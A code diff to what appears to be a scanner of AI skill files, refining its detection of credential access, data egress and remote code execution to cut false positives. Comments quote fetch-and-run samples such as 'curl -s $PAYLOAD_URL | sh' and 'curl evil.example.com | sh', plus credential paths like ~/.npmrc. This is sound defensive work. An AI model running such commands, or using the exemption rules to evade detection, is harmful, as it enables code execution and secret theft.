@@ -444,6 +444,57 @@ function detectFetchThenExec(text: string): Array<{ match: string; index: number
 }
 
 /**
+ * A credential path that is the *destination* of a shell write
+ * (`cat > "$HOME/.npmrc"`, `>> ~/.netrc`, `tee ~/.npmrc`) is configuration
+ * being written, not a secret being read. Found in cisco-ai-defense/
+ * skill-scanner's human-labeled safe fixture `registry-default-mirror`,
+ * which writes a registry line into ~/.npmrc and was reported as
+ * credential exfiltration.
+ */
+function isWriteTarget(text: string, index: number): boolean {
+  const lineStart = text.lastIndexOf("\n", index - 1) + 1;
+  const before = text.slice(lineStart, index).replace(/["'{}$\w]*$/, "").trimEnd();
+  return /(?:^|[^<>&\d])>>?$/.test(before) || /\btee(?:\s+-a)?$/.test(before);
+}
+
+/**
+ * `curl -fsSL https://host/notes.txt -o notes.txt`: a download of a literal
+ * URL to a file, carrying no local data out. Anything that can carry data
+ * (a body/form/upload flag, a non-GET method, a header, or shell
+ * interpolation anywhere in the command) is still egress.
+ */
+function isPlainDownload(text: string, index: number): boolean {
+  const lineEnd = text.indexOf("\n", index);
+  const line = text.slice(index, lineEnd === -1 ? undefined : lineEnd);
+  if (!/^\s*(?:curl|wget)\b/i.test(line)) return false;
+  if (/[$`]|<\(|\|/.test(line)) return false;
+  if (/\s(?:-d|--data[\w-]*|-F|--form[\w-]*|-T|--upload-file|-X|--request|-H|--header|--post-data|--post-file|--body-data|--body-file|--method)\b/i.test(line)) return false;
+  return /\s(?:-o|-O|--output|--remote-name|-P|--output-document)\b/.test(line);
+}
+
+/**
+ * A fetch-and-run command names what it fetches: a real host
+ * (`https://get.example-tool.dev/install.sh`), an IP, or a shell variable
+ * holding the URL (`curl -s $PAYLOAD_URL | sh`). Prose that *warns against*
+ * the pattern with a placeholder (`curl ... | sh`) names nothing. Found in
+ * wonderwhy-er/DesktopCommanderMCP's terminal skill: "Be careful with
+ * (`curl ... | sh`), that's untrusted code execution; show it and confirm
+ * first" was reported as the skill executing remote code.
+ */
+const FETCH_TARGET = /https?:\/\/[a-z0-9][\w-]*(?:\.[\w-]+)+|\b\d{1,3}(?:\.\d{1,3}){3}\b|\$\{?[A-Za-z_]\w*\}?/i;
+// `curl evil.example.com | sh`: a scheme-less host. File names are not hosts.
+const BARE_HOST = /\b[a-z0-9][\w-]*(?:\.[a-z0-9][\w-]*)*\.([a-z]{2,})\b/gi;
+const FILE_EXTENSIONS = new Set(["sh", "md", "txt", "py", "js", "ts", "json", "yaml", "yml", "toml", "ps1", "bat", "exe", "zip", "gz", "tgz"]);
+
+function fetchesSomething(text: string, index: number, length: number): boolean {
+  const lineStart = text.lastIndexOf("\n", index - 1) + 1;
+  const lineEnd = text.indexOf("\n", index + length);
+  const span = text.slice(lineStart, lineEnd === -1 ? undefined : lineEnd);
+  if (FETCH_TARGET.test(span)) return true;
+  return [...span.matchAll(BARE_HOST)].some((m) => !FILE_EXTENSIONS.has(m[1].toLowerCase()));
+}
+
+/**
  * Detect capabilities in a file's text, retrying across deobfuscated variants
  * so homoglyph/zero-width/splice-cloaked commands are still found.
  *
@@ -464,19 +515,32 @@ export function detectCapabilities(text: string): CapabilityHit[] {
       hits.push({ kind, match: match.slice(0, 120), line: lineOf(variant.text, index), transforms: variant.transforms });
     };
 
-    for (const re of [...CREDENTIAL_PATTERNS, ...ENV_ENUMERATION_PATTERNS]) {
+    for (const re of CREDENTIAL_PATTERNS) {
+      for (const m of variant.text.matchAll(new RegExp(re.source, `${re.flags.replace("g", "")}g`))) {
+        if (isWriteTarget(variant.text, m.index)) continue;
+        add("credential-access", m[0], m.index);
+        break;
+      }
+    }
+    for (const re of ENV_ENUMERATION_PATTERNS) {
       const m = re.exec(variant.text);
       if (m) add("credential-access", m[0], m.index);
     }
 
     for (const re of [EGRESS_COMMAND, EGRESS_CALL]) {
-      const m = re.exec(variant.text);
-      if (m && !LOCAL_HOST_RE.test(m[1] ?? "")) add("network-egress", m[0], m.index);
+      for (const m of variant.text.matchAll(new RegExp(re.source, `${re.flags.replace("g", "")}g`))) {
+        if (LOCAL_HOST_RE.test(m[1] ?? "") || isPlainDownload(variant.text, m.index)) continue;
+        add("network-egress", m[0], m.index);
+        break;
+      }
     }
 
     for (const re of REMOTE_EXEC_PATTERNS) {
-      const m = re.exec(variant.text);
-      if (m) add("remote-code-exec", m[0], m.index);
+      for (const m of variant.text.matchAll(new RegExp(re.source, `${re.flags.replace("g", "")}g`))) {
+        if (!fetchesSomething(variant.text, m.index, m[0].length)) continue;
+        add("remote-code-exec", m[0], m.index);
+        break;
+      }
     }
 
     for (const hit of detectFetchThenExec(variant.text)) {
